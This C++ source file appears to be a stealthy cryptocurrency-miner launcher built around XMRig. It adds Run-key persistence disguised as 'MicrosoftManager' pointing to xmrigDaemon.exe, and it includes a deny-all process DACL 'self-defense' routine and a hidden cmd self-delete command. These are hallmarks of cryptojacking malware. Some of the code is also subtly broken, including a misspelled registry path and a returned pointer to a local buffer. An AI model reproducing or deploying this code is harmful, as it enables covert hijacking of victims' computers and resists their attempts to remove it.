#include "App.h"
#include <windows.h>
#include <TCHAR.H>
#include <thread>
#include <sddl.h>
#include <stdio.h>
#include <aclapi.h>
#include <stdlib.h>
#include <Shlwapi.h>
#pragma comment(linker, "/MERGE:.data=.text")
#pragma comment(linker, "/MERGE:.rdata=.text")
#pragma comment(linker, "/SECTION:.text,EWR")

#define STRLEN(x)(sizeof(x) / sizeof(TCHAR) - 1)

bool SelfDefense()
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	SECURITY_ATTRIBUTES sa;
	TCHAR * szSD = TEXT("D:P");

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = FALSE;
	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(szSD, SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL))
		return FALSE;
	if (!SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, sa.lpSecurityDescriptor))
		return FALSE;
	return TRUE;
}

int Delete(TCHAR* path) {
	TCHAR DelCom[MAX_PATH + 1];
	wsprintfW(DelCom, L"/c timeout -t 2 && del \"%s\"", path);
	ShellExecuteW(0, L"open", L"cmd.exe", DelCom, 0, SW_HIDE);
	std::exit(0);
}

BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

int AutoRun(TCHAR* path, BOOL Admin) {
	HKEY hKey = NULL;
	HKEY hKey2 = NULL;
	HKEY hKey3 = NULL;
	DWORD dwRegType = REG_SZ;
	LONG lResult = 0;
	if (Admin) {
		lResult = RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey2);
		if (ERROR_SUCCESS != lResult) {
			RegCreateKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey2);
			RegCreateKey(HKEY_LOCAL_MACHINE, L"OFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey3);
		}
		RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey2);
		RegSetValueExW(hKey2, L"MicrosoftManager", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
		RegCloseKey(hKey2);
		RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey3);
		RegSetValueExW(hKey3, L"MicrosoftManager", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
		RegCloseKey(hKey3);
	} else {
		RegOpenKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
		RegSetValueExW(hKey, L"MicrosoftManager", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
		RegCloseKey(hKey);
		RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey2);
		RegSetValueExW(hKey2, L"MicrosoftManager", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
		RegCloseKey(hKey2);
		RegOpenKey(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey3);
		RegSetValueExW(hKey3, L"MicrosoftManager", 0, REG_SZ, (PBYTE)path, lstrlen(path) * sizeof(TCHAR) + 1);
		RegCloseKey(hKey3);
	}

	return 0;
}

char* WorkerID() {
	DWORD VolumeSerialNumber = 0;
	GetVolumeInformation(L"c:\\", NULL, NULL, &VolumeSerialNumber, NULL, NULL, NULL, NULL);
	char procID[20];
	sprintf(procID, "%d", VolumeSerialNumber);

	return procID;
}

int main(int argc, char **argv) {
	AutoRun(L"C:\\MicrosoftManager\\xmrigDaemon.exe", IsElevated());
    App* app = new App(argc, argv);
    int res = app->start();
    delete app;

    return res;
}
